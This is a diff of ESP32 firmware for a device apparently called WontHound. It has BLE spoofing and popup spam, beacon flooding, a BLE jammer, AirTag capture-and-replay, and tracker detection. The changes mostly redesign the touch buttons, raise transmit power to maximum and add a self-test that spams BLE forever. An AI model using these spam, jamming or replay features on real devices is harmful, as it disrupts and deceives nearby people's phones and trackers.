+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     Serial.println("[BLESPOOF] BLE stack initialized, max TX power set");
 
@@ -1283,18 +1531,11 @@ void setup() {
         currentMode = MODE_APPLE_POPUP;
     }
 
-    // Draw full UI
-    drawIconBar();
-    drawHeader();
-    drawEqualizer();
-    drawSkulls();
-    drawCounter();
-
-    addLogEntry("[*] BLE Spoofer ready", WONTHOUND_MAGENTA);
-    char modeBuf[42];
-    snprintf(modeBuf, sizeof(modeBuf), "[*] Mode: %s", MODE_NAMES[currentMode]);
-    addLogEntry(modeBuf, WONTHOUND_MAGENTA);
-    drawLog();  // Force initial log display
+    // Draw full UI (resistive-friendly: big spaced controls, no mode-log)
+    spComputeButtons();
+    drawIconBar();     // header band + "< Back" pill + huge START/STOP
+    drawHeader();      // big MODE + DEVICE selectors
+    drawCounter();     // broadcast-rate readout along the bottom
 
     lastDisplayUpdate = millis();
     initialized = true;
@@ -1313,45 +1554,15 @@ void loop() {
     // TOUCH HANDLING - with release detection (prevents repeat triggers)
     // Icons: Back=10, Toggle=60, PrevMode=105, NextMode=140, PrevDev=180, NextDev=215
     // ═══════════════════════════════════════════════════════════════════════
+    // Big, well-separated targets, all kept clear of the fixed top-left Back
+    // zone (x<64,y<58) so a tap on START can never be swallowed as Back.
     uint16_t tx, ty;
     if (getTouchPoint(&tx, &ty)) {
-        // Icon bar area
-        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
-            // Wait for touch release to prevent repeated triggers
-            waitForTouchRelease();
-
-            // Back icon (x=10)
-            if (tx >= SCALE_X(5) && tx <= SCALE_X(30)) {
-                if (spamming) stopSpam();
-                exitRequested = true;
-                return;
-            }
-            // Toggle icon (x=60)
-            else if (tx >= SCALE_X(50) && tx <= SCALE_X(80)) {
-                toggleSpam();
-                return;
-            }
-            // Prev mode icon (x=105)
-            else if (tx >= SCALE_X(95) && tx <= SCALE_X(125)) {
-                prevMode();
-                return;
-            }
-            // Next mode icon (x=140)
-            else if (tx >= SCALE_X(130) && tx <= SCALE_X(160)) {
-                nextMode();
-                return;
-            }
-            // Prev device icon (x=180)
-            else if (tx >= SCALE_X(170) && tx <= SCALE_X(200)) {
-                prevDevice();
-                return;
-            }
-            // Next device icon at right edge
-            else if (tx >= (tft.width() - SCALE_X(35)) && tx <= tft.width()) {
-                nextDevice();
-                return;
-            }
-        }
+        if (whHit(tx, ty, spStart))      { waitForTouchRelease(); toggleSpam();  return; }
+        else if (whHit(tx, ty, spModeL)) { waitForTouchRelease(); prevMode();    return; }
+        else if (whHit(tx, ty, spModeR)) { waitForTouchRelease(); nextMode();    return; }
+        else if (whHit(tx, ty, spDevL))  { waitForTouchRelease(); prevDevice();  return; }
+        else if (whHit(tx, ty, spDevR))  { waitForTouchRelease(); nextDevice();  return; }
     }
 
     // Hardware button fallback
@@ -1374,20 +1585,33 @@ void loop() {
     // Feed the watchdog
     yield();
 
-    // ═══════════════════════════════════════════════════════════════════════
-    // DISPLAY UPDATE (~10fps = 100ms throttle for skulls + counter + log)
-    // ═══════════════════════════════════════════════════════════════════════
+    // Refresh only the broadcast-rate readout (~10fps). No more skull/EQ/log.
     if (millis() - lastDisplayUpdate >= 100) {
-        drawEqualizer();
-        drawSkulls();
         drawCounter();
-        drawLog();
         lastDisplayUpdate = millis();
     }
 }
 
 bool isExitRequested() {
     return exitRequested;
+}
+
+// DIAGNOSTIC self-test: bring up BLE exactly like the real screen, force CHAOS
+// mode, and broadcast forever in-line (no task, no UI, no touch). This lets the
+// host verify RF over the air without anyone pressing START.
+void selfTestSpam() {
+    setup();                       // full BLE init (WiFi off, BLEDevice::init, TX power)
+    currentMode = MODE_CHAOS;
+    spamming = true;               // doBroadcast() gates on this via nothing, but keep true
+    Serial.println("[SELFTEST] BLE CHAOS auto-spam — no UI, broadcasting forever");
+    uint32_t n = 0;
+    while (true) {
+        doBroadcast();             // emits [BLESPOOF] TX ok / TX FAIL diagnostics
+        if (++n % 100 == 0) {
+            Serial.printf("[SELFTEST] broadcasts=%lu heap=%lu\n",
+                          (unsigned long)n, (unsigned long)esp_get_free_heap_size());
+        }
+    }
 }
 
 void cleanup() {
@@ -1416,7 +1640,7 @@ void cleanup() {
 
 void bleInit() {
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
 }
 
 void bleCleanup() {
@@ -1610,15 +1834,16 @@ static void bcnDrawLog() {
 // UI DRAWING
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Big, labeled control bar — four full-height buttons, each one quarter of the
+// width, matching the touch columns in loop(). Replaces the cramped 16px icons.
+// Dedicated Back (owns the fixed back zone) + 3 spread actions clear of it.
 static void bcnDrawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    for (int i = 0; i < BCN_ICON_NUM; i++) {
-        uint16_t color = WONTHOUND_MAGENTA;
-        if (i == 1 && beaconing) color = WONTHOUND_HOTPINK;
-        tft.drawBitmap(bcnIconX[i], ICON_BAR_Y, bcnIcons[i], BCN_ICON_SIZE, BCN_ICON_SIZE, color);
-    }
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[3];
+    whTopBarActions(3, a);
+    whTopBtn(a[0], beaconing ? "STOP" : "BEACON", beaconing ? WH_ON : WH_ACCENT);
+    whTopBtn(a[1], "MODE-", WH_OUTLINE);
+    whTopBtn(a[2], "MODE+", WH_OUTLINE);
 }
 
 static void bcnDrawHeader() {
@@ -2133,11 +2358,11 @@ void setup() {
 
     // Initialize BLE — wait for controller ready before TX power
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
     delay(150);  // BLE controller needs time to finish internal init
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     Serial.println("[BEACON] BLE stack initialized, max TX power set");
 
@@ -2185,32 +2410,13 @@ void loop() {
     // ═══════════════════════════════════════════════════════════════════════
     uint16_t tx, ty;
     if (getTouchPoint(&tx, &ty)) {
-        // Icon bar area
-        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
-            waitForTouchRelease();
-
-            // Back icon (x=10)
-            if (tx >= SCALE_X(5) && tx <= SCALE_X(30)) {
-                if (beaconing) stopBeacon();
-                exitRequested = true;
-                return;
-            }
-            // Toggle icon (x=70)
-            else if (tx >= SCALE_X(60) && tx <= SCALE_X(90)) {
-                toggleBeacon();
-                return;
-            }
-            // Prev mode icon (x=140)
-            else if (tx >= SCALE_X(130) && tx <= SCALE_X(160)) {
-                prevMode();
-                return;
-            }
-            // Next mode icon (x=200)
-            else if (tx >= SCALE_X(190) && tx <= SCALE_X(220)) {
-                nextMode();
-                return;
-            }
-        }
+        // Dedicated Back button + 3 spread actions (none in the Back zone).
+        WhRect a[3];
+        whTopBarActions(3, a);
+        if (whHit(tx, ty, whBackButtonRect())) { waitForTouchRelease(); if (beaconing) stopBeacon(); exitRequested = true; return; }
+        else if (whHit(tx, ty, a[0]))          { waitForTouchRelease(); toggleBeacon(); return; }
+        else if (whHit(tx, ty, a[1]))          { waitForTouchRelease(); prevMode();     return; }
+        else if (whHit(tx, ty, a[2]))          { waitForTouchRelease(); nextMode();     return; }
     }
 
     // Hardware button fallback
@@ -2291,13 +2497,14 @@ static int deviceCount = 0;
 static int bscanIconX[BSCAN_ICON_NUM] = {210, 10};
 static int bscanIconY = ICON_BAR_Y;
 
-// Draw icon bar - MATCHES ORIGINAL ESP32-DIV
+// Big, labeled control bar — two full-height buttons (Back | CLEAR). Bar height
+// is trimmed to clear the device list, which starts at y37 on this screen.
+// Dedicated Back (owns the fixed back zone) + one big CLEAR/rescan button.
 static void drawBleScanUI() {
-    tft.drawLine(0, ICON_BAR_TOP, tft.width(), ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(SCALE_X(140), ICON_BAR_Y, SCREEN_WIDTH - SCALE_X(140), ICON_BAR_H, WONTHOUND_GUNMETAL);
-    tft.drawBitmap(bscanIconX[0], bscanIconY, bitmap_icon_undo, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, WONTHOUND_MAGENTA);
-    tft.drawBitmap(bscanIconX[1], bscanIconY, bitmap_icon_go_back, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, WONTHOUND_MAGENTA);
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[1];
+    whTopBarActions(1, a);
+    whTopBtn(a[0], "CLEAR", WH_OUTLINE);
 }
 
 // Draw device list
@@ -2328,7 +2535,7 @@ static void drawDeviceList() {
         if (device.getName().length() > 0) {
             name = String(device.getName().c_str()).substring(0, 16);
         } else if (device.haveManufacturerData()) {
-            std::string mfg = device.getManufacturerData();
+            std::string mfg = whToStdString(device.getManufacturerData());
             if (mfg.length() >= 2) {
                 uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
                 const char* cn = lookupCompanyName(cid);
@@ -2378,7 +2585,7 @@ static void drawDeviceDetails() {
     if (device.getName().length() > 0) {
         name = String(device.getName().c_str());
     } else if (device.haveManufacturerData()) {
-        std::string mfg = device.getManufacturerData();
+        std::string mfg = whToStdString(device.getManufacturerData());
         if (mfg.length() >= 2) {
             uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
             const char* cn = lookupCompanyName(cid);
@@ -2469,7 +2676,7 @@ void setup() {
     delay(50);
 
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);  // BLE controller needs time after deinit/reinit cycle
 
     pBleScan = BLEDevice::getScan();
@@ -2505,25 +2712,22 @@ void loop() {
     if (millis() - lastIconTap > 200) {
         uint16_t tx, ty;
         if (getTouchPoint(&tx, &ty)) {
-            if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM) {
-                // Back icon
-                if (isTopLeftBackTouch(&tx, &ty)) {
-                    if (detailView) {
-                        detailView = false;
-                        drawDeviceList();
-                        waitForTouchRelease();  // Eat touch so .ino isBackButtonTapped() doesn't double-fire
-                    } else {
-                        exitRequested = true;
-                    }
-                    lastIconTap = millis();
-                    return;
+            WhRect a[1];
+            whTopBarActions(1, a);
+            if (whHit(tx, ty, whBackButtonRect())) {         // Back
+                if (detailView) {
+                    detailView = false;
+                    drawDeviceList();
+                    waitForTouchRelease();  // Eat touch so .ino isBackButtonTapped() doesn't double-fire
+                } else {
+                    exitRequested = true;
                 }
-                // Undo/Rescan icon at x=210-226
-                else if (tx >= 210 && tx < 226) {
-                    startScan();
-                    lastIconTap = millis();
-                    return;
-                }
+                lastIconTap = millis();
+                return;
+            } else if (whHit(tx, ty, a[0])) {                // CLEAR / rescan
+                startScan();
+                lastIconTap = millis();
+                return;
             }
         }
     }
@@ -2757,12 +2961,12 @@ static void drawRssiBar(int x, int y, int rssi) {
 // UI DRAWING
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Dedicated Back (owns the fixed back zone) + one big SCAN button clear of it.
 static void drawIconBar() {
-    tft.drawLine(0, 19, SCREEN_WIDTH, 19, WONTHOUND_MAGENTA);
-    tft.fillRect(0, 20, SCREEN_WIDTH, 16, WONTHOUND_GUNMETAL);
-    tft.drawBitmap(10, 20, bitmap_icon_go_back, AT_ICON_SIZE, AT_ICON_SIZE, WONTHOUND_MAGENTA);
-    tft.drawBitmap(210, 20, bitmap_icon_undo, AT_ICON_SIZE, AT_ICON_SIZE, WONTHOUND_MAGENTA);
-    tft.drawLine(0, 36, SCREEN_WIDTH, 36, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[1];
+    whTopBarActions(1, a);
+    whTopBtn(a[0], "SCAN", WH_OUTLINE);
 }
 
 static void drawTitle() {
@@ -2960,7 +3164,7 @@ static void processScanResults(BLEScanResults results) {
 
         if (!device.haveManufacturerData()) continue;
 
-        std::string mfgData = device.getManufacturerData();
+        std::string mfgData = whToStdString(device.getManufacturerData());
         if (mfgData.length() < 4) continue;
 
         // Check for Apple company ID (0x004C) + FindMy type (0x12) + length (0x19)
@@ -3038,7 +3242,7 @@ void setup() {
 
     // Init BLE
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     pAtScan = BLEDevice::getScan();
@@ -3082,23 +3286,22 @@ void loop() {
     if (millis() - lastIconTap > 200) {
         uint16_t tx, ty;
         if (getTouchPoint(&tx, &ty)) {
-            if (ty >= 20 && ty <= 36) {
-                if (isTopLeftBackTouch(&tx, &ty)) {
-                    if (detailView) {
-                        detailView = false;
-                        drawTrackerList();
-                    } else {
-                        exitRequested = true;
-                    }
-                    lastIconTap = millis();
-                    return;
+            WhRect a[1];
+            whTopBarActions(1, a);
+            if (whHit(tx, ty, whBackButtonRect())) {         // Back
+                if (detailView) {
+                    detailView = false;
+                    drawTrackerList();
+                } else {
+                    exitRequested = true;
                 }
-                else if (tx >= 210 && tx < 226) {
-                    runScan();
-                    if (!detailView) drawTrackerList();
-                    lastIconTap = millis();
-                    return;
-                }
+                lastIconTap = millis();
+                return;
+            } else if (whHit(tx, ty, a[0])) {                // SCAN / rescan
+                runScan();
+                if (!detailView) drawTrackerList();
+                lastIconTap = millis();
+                return;
             }
         }
     }
@@ -3561,7 +3764,7 @@ static void processScanResults(BLEScanResults results) {
         // Check service data for tracker UUIDs
         if (device.haveServiceData()) {
             BLEUUID sdUUID = device.getServiceDataUUID();
-            std::string sd = device.getServiceData();
+            std::string sd = whToStdString(device.getServiceData());
 
             // Google FMDN — UUID 0xFEAA, frame type 0x40 or 0x41
             if (sdUUID.equals(UUID_FMDN) && sd.length() >= 1) {
@@ -3623,7 +3826,7 @@ static void processScanResults(BLEScanResults results) {
 
         // Apple AirTag — Manufacturer data 0x004C, type 0x12, len 0x19
         if (device.haveManufacturerData()) {
-            std::string mfgData = device.getManufacturerData();
+            std::string mfgData = whToStdString(device.getManufacturerData());
             if (mfgData.length() >= 4) {
                 uint8_t compLow  = (uint8_t)mfgData[0];
                 uint8_t compHigh = (uint8_t)mfgData[1];
@@ -3692,7 +3895,7 @@ void setup() {
 
     // Init BLE
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     pTdScan = BLEDevice::getScan();
@@ -3888,15 +4091,14 @@ static uint16_t pfGradientColor(float ratio) {
 // UI DRAWING — WontHound Visual Suite (zero-buffer, computed animations)
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Big, labeled control bar: small BACK (left fifth) + huge START/STOP (rest),
+// matching the loop() touch split. START fills solid hot-pink while flooding.
+// Dedicated Back (owns the fixed back zone) + one huge START/STOP clear of it.
 static void pfDrawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    // Back icon
-    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, WONTHOUND_MAGENTA);
-    // Toggle icon
-    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_start, 16, 16,
-                   flooding ? WONTHOUND_HOTPINK : WONTHOUND_MAGENTA);
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[1];
+    whTopBarActions(1, a);
+    whTopBtn(a[0], flooding ? "STOP" : "START", flooding ? WH_ON : WH_ACCENT);
 }
 
 static void pfDrawHeader() {
@@ -4239,7 +4441,7 @@ static void floodTxTask(void* param) {
 
 static void startFloodTask() {
     if (floodTaskHandle != NULL) return;
-    xTaskCreatePinnedToCore(floodTxTask, "pfFlood", 4096, NULL, 1, &floodTaskHandle, 0);
+    xTaskCreatePinnedToCore(floodTxTask, "pfFlood", 8192, NULL, 1, &floodTaskHandle, 0);  // 8192 to match working spoofer/beacon — 4096 overflows the NimBLE adv call chain on C5
 }
 
 static void stopFloodTask() {
@@ -4308,11 +4510,11 @@ void setup() {
     delay(200);
 
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
     delay(150);
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     Serial.println("[PHANTOM] BLE stack initialized, max TX power set");
 
@@ -4347,19 +4549,11 @@ void loop() {
 
     uint16_t tx, ty;
     if (getTouchPoint(&tx, &ty)) {
-        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
-            waitForTouchRelease();
-
-            if (tx >= 5 && tx <= 30) {
-                if (flooding) stopFlood();
-                exitRequested = true;
-                return;
-            }
-            else if (tx >= 50 && tx <= 80) {
-                toggleFlood();
-                return;
-            }
-        }
+        // Dedicated Back button + one big START/STOP (clear of the Back zone).
+        WhRect a[1];
+        whTopBarActions(1, a);
+        if (whHit(tx, ty, whBackButtonRect())) { waitForTouchRelease(); if (flooding) stopFlood(); exitRequested = true; return; }
+        else if (whHit(tx, ty, a[0]))          { waitForTouchRelease(); toggleFlood(); return; }
     }
 
     if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
@@ -4553,7 +4747,7 @@ static void processScanResults(BLEScanResults results) {
 
         if (!device.haveManufacturerData()) continue;
 
-        std::string mfgData = device.getManufacturerData();
+        std::string mfgData = whToStdString(device.getManufacturerData());
         if (mfgData.length() < 27) continue;  // Need at least company(2)+type(1)+len(1)+status(1)+pk22=27
 
         // Check for Apple company ID (0x004C) + FindMy type (0x12) + OF length (0x19)
@@ -4697,7 +4891,7 @@ static void replayTxTask(void* param) {
 
 static void startReplayTask() {
     if (S->replayTaskHandle != NULL) return;
-    xTaskCreatePinnedToCore(replayTxTask, "arReplay", 4096, NULL, 1, &S->replayTaskHandle, 0);
+    xTaskCreatePinnedToCore(replayTxTask, "arReplay", 8192, NULL, 1, &S->replayTaskHandle, 0);  // 8192 to match working spoofer/beacon — 4096 overflows the NimBLE adv call chain on C5
 }
 
 static void stopReplayTask() {
@@ -4722,17 +4916,15 @@ static void stopReplayTask() {
 // UI DRAWING — Phase 1: SCAN (list view) / Phase 2: REPLAY (broadcasting)
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Big, labeled control bar — three full-height buttons (Back | SCAN | PLAY).
+// Bar height trimmed to 36 to clear the header, which begins at y38.
+// Dedicated Back (owns the fixed back zone) + 2 spread actions (SCAN | PLAY).
 static void arDrawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    // Back
-    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, WONTHOUND_MAGENTA);
-    // Scan
-    tft.drawBitmap(60, ICON_BAR_Y, bitmap_icon_undo, 16, 16, WONTHOUND_MAGENTA);
-    // Play/Stop
-    tft.drawBitmap(110, ICON_BAR_Y, bitmap_icon_start, 16, 16,
-                   S->replaying ? WONTHOUND_HOTPINK : WONTHOUND_MAGENTA);
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[2];
+    whTopBarActions(2, a);
+    whTopBtn(a[0], "SCAN", WH_OUTLINE);
+    whTopBtn(a[1], S->replaying ? "STOP" : "PLAY", S->replaying ? WH_ON : WH_ACCENT);
 }
 
 static void arDrawHeader() {
@@ -5032,11 +5224,11 @@ static void startReplay() {
 
     // Re-init for advertising
     releaseClassicBtMemory();
-    BLEDevice::init("WontHound");
+    wh_ble_init_max_power("WontHound");
     delay(150);
 
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
 
     S->replaying = true;
     S->replayCount = 0;
@@ -5067,7 +5259,7 @@ static void stopReplay() {
     delay(100);
 
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     S->pArScan = BLEDevice::getScan();
@@ -5131,7 +5323,7 @@ void setup() {
 
     // Init BLE for scanning
     releaseClassicBtMemory();
-    BLEDevice::init("");
+    wh_ble_init_max_power("");
     delay(150);
 
     S->pArScan = BLEDevice::getScan();
@@ -5180,47 +5372,43 @@ void loop() {
     if (millis() - S->lastIconTap > 250) {
         uint16_t tx, ty;
         if (getTouchPoint(&tx, &ty)) {
-            if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
+            // Dedicated Back + 2 spread actions (SCAN | PLAY) — none in Back zone.
+            WhRect a[2];
+            whTopBarActions(2, a);
+            if (whHit(tx, ty, whBackButtonRect())) {          // Back
                 waitForTouchRelease();
-
-                // Back button (x: 10-30)
-                if (tx >= 5 && tx <= 30) {
-                    if (S->replaying) stopReplay();
-                    S->exitRequested = true;
-                    S->lastIconTap = millis();
-                    return;
+                if (S->replaying) stopReplay();
+                S->exitRequested = true;
+                S->lastIconTap = millis();
+                return;
+            } else if (whHit(tx, ty, a[0])) {                 // Scan
+                waitForTouchRelease();
+                if (!S->replaying && S->pArScan) {
+                    arDrawStatus("SCANNING...", WONTHOUND_MAGENTA);
+                    runScan();
+                    char sbuf[24];
+                    snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
+                    arDrawStatus(sbuf, WONTHOUND_GREEN);
+                    arDrawTagList();
                 }
-                // Scan button (x: 60-80)
-                else if (tx >= 50 && tx <= 80) {
-                    if (!S->replaying && S->pArScan) {
-                        arDrawStatus("SCANNING...", WONTHOUND_MAGENTA);
-                        runScan();
-                        char sbuf[24];
-                        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
-                        arDrawStatus(sbuf, WONTHOUND_GREEN);
-                        arDrawTagList();
-                    }
-                    S->lastIconTap = millis();
-                    return;
-                }
-                // Play/Stop button (x: 110-130)
-                else if (tx >= 100 && tx <= 135) {
-                    if (S->tagCount > 0) {
-                        // If no tag selected yet, auto-select current
-                        if (!S->replaying) {
-                            bool anySelected = false;
-                            for (int i = 0; i < S->tagCount; i++) {
-                                if (S->captured[i].selected) { anySelected = true; break; }
-                            }
-                            if (!anySelected) {
-                                S->captured[S->currentIndex].selected = true;
-                            }
+                S->lastIconTap = millis();
+                return;
+            } else if (whHit(tx, ty, a[1])) {                 // Play/Stop
+                waitForTouchRelease();
+                if (S->tagCount > 0) {
+                    if (!S->replaying) {
+                        bool anySelected = false;
+                        for (int i = 0; i < S->tagCount; i++) {
+                            if (S->captured[i].selected) { anySelected = true; break; }
                         }
-                        toggleReplay();
+                        if (!anySelected) {
+                            S->captured[S->currentIndex].selected = true;
+                        }
                     }
-                    S->lastIconTap = millis();
-                    return;
+                    toggleReplay();
                 }
+                S->lastIconTap = millis();
+                return;
             }
         }
     }
@@ -5588,16 +5776,14 @@ static bool bjIsAdvChannel(int ch) {
 // UI DRAWING FUNCTIONS
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Dedicated Back (owns the fixed back zone) + 3 spread actions clear of it.
 static void drawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    for (int i = 0; i < BJ_ICON_NUM; i++) {
-        uint16_t color = WONTHOUND_MAGENTA;
-        if (i == 1 && jamming) color = WONTHOUND_HOTPINK;   // Toggle icon hot when jamming
-        if (i == 4 && jamming) color = WONTHOUND_HOTPINK;  // Antenna icon hot when jamming
-        tft.drawBitmap(bjIconX[i], ICON_BAR_Y, bjIcons[i], BJ_ICON_SIZE, BJ_ICON_SIZE, color);
-    }
-    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, WONTHOUND_HOTPINK);
+    whDrawBackButton();
+    WhRect a[3];
+    whTopBarActions(3, a);
+    whTopBtn(a[0], jamming ? "STOP" : "JAM", jamming ? WH_ON : WH_ACCENT);
+    whTopBtn(a[1], "MODE-", WH_OUTLINE);
+    whTopBtn(a[2], "MODE+", WH_OUTLINE);
 }
 
 // Helper to draw centered FreeFont text (Proto Kill style)
@@ -6127,47 +6313,17 @@ void loop() {
     // ═══════════════════════════════════════════════════════════════════════
     uint16_t tx, ty;
     if (getTouchPoint(&tx, &ty)) {
-        // Icon bar area
-        if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
-            // Wait for touch release to prevent repeated triggers
+        // Dedicated Back button + 3 spread actions (none in the Back zone).
+        WhRect a[3];
+        whTopBarActions(3, a);
+        if (whHit(tx, ty, whBackButtonRect())) { waitForTouchRelease(); if (jamming) stopJamming(); exitRequested = true; return; }
+        else if (whHit(tx, ty, a[0])) {                                     // JAM toggle
             waitForTouchRelease();
-
-            // Back icon (x=10)
-            if (tx >= 5 && tx <= 30) {
-                if (jamming) stopJamming();
-                exitRequested = true;
-                return;
-            }
-            // Toggle icon (x=60)
-            else if (tx >= 50 && tx <= 80) {
-                if (jamming) stopJamming(); else startJamming();
-                drawIconBar();
-                drawBjMainUI();
-                return;
-            }
-            // Prev mode icon (x=105)
-            else if (tx >= 95 && tx <= 125) {
-                prevMode();
-                drawBjMainUI();
-                return;
-            }
-            // Next mode icon (x=140)
-            else if (tx >= 130 && tx <= 160) {
-                nextMode();
-                drawBjMainUI();
-                return;
-            }
-            // Antenna icon (x=180) - visual indicator only
-            else if (tx >= 170 && tx <= 200) {
-                return;
-            }
-            // Cycle mode icon at right edge
-            else if (tx >= (tft.width() - 35) && tx <= tft.width()) {
-                nextMode();
-                drawBjMainUI();
-                return;
-            }
+            if (jamming) stopJamming(); else startJamming();
+            drawIconBar(); drawBjMainUI(); return;
         }
+        else if (whHit(tx, ty, a[1])) { waitForTouchRelease(); prevMode(); drawBjMainUI(); return; }
+        else if (whHit(tx, ty, a[2])) { waitForTouchRelease(); nextMode(); drawBjMainUI(); return; }
     }
 
     // Hardware button fallback
@@ -6531,7 +6687,7 @@ class SnifferCallbacks : public BLEAdvertisedDeviceCallbacks {
 
         // Copy manufacturer data
         if (advertisedDevice.haveManufacturerData()) {
-            std::string mfg = advertisedDevice.getManufacturerData();
+            std::string mfg = whToStdString(advertisedDevice.getManufacturerData());
             pendingMfgLen = mfg.length() > 8 ? 8 : mfg.length();
             memcpy(pendingMfgData, mfg.data(), pendingMfgLen);
         } else {
@@ -6556,30 +6712,18 @@ static void scanCompleteCallback(BLEScanResults results) {
 // UI DRAWING
 // ═══════════════════════════════════════════════════════════════════════════
 
+// Big, labeled control bar — five full-height buttons matching loop()'s columns:
+// Back | SCAN (toggle) | Filt< | Filt> | INFO. The legacy BLE-pulse indicator is
+// dropped (SCAN lit pink = scanning). Bar height 38 clears the header at y38.
+// Dedicated Back (owns the fixed back zone) + 4 spread actions clear of it.
 static void drawIconBar() {
-    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, WONTHOUND_MAGENTA);
-    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, WONTHOUND_GUNMETAL);
-    for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
-        uint16_t color = WONTHOUND_MAGENTA;
-        // Use WONTHOUND_MAGENTA (Electric Blue 0x041F) for active — CYAN and HOTPINK are same color (0xF81F)
-        if (i == 1 && scanning) color = WONTHOUND_MAGENTA;    // Scan toggle ELECTRIC BLUE when active
-        if (i == 1 && !scanning) color = WONTHOUND_GUNMETAL;  // Scan toggle dim when stopped
-        if (i == 5 && scanning) color = WONTHOUND_MAGENTA;    // BLE pulse ELECTRIC BLUE when active
-        if (i == 5 && !scanning) color = WONTHOUND_GUNMETAL;  // BLE pulse dim when stopped
-        tft.drawBitmap(bsniffIconX[i], ICON_BAR_Y, bsniffIcons[i], BSNIFF_ICON_SIZE, BSNIFF_ICON_SIZE, color);
-    }
